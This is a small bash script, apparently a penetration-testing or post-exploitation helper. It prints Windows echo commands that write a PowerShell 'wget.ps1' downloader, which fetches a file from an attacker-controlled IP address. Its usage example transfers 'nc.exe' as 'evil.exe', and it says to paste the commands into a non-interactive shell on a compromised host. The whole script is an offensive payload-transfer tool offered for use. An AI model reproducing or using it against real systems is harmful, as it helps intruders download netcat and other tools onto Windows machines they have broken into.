#!/bin/bash

function helper() {
  echo "[*] Simple windows wget powershell command generation"
  echo "[*] Usage: $0 <ip addr> <filename> <output>"
  echo "[*] Example:"
  echo -e "[*] \t$0 10.0.0.1 nc.exe evil.exe"
  echo "[*]"
  echo "[*] Copy/Past and GG WP"
  echo "[*] Into non interactive shell"
  exit 0
}

if [ -z $1 ] || [ -z $2 ] || [ -z $3 ]; then
  helper
fi

echo "[*] Simple windows wget powershell command generation"
echo "[*] Copy/Past and GG WP"
echo ""

echo "
echo \$storageDir = \$pwd > wget.ps1 
echo \$webclient = New-Object System.Net.WebClient >> wget.ps1
echo \$url = \"http://$1/$2\" >> wget.ps1
echo \$file = \"$3\" >> wget.ps1
echo \$webclient.DownloadFile(\$url,\$file) >> wget.ps1
"
echo ""
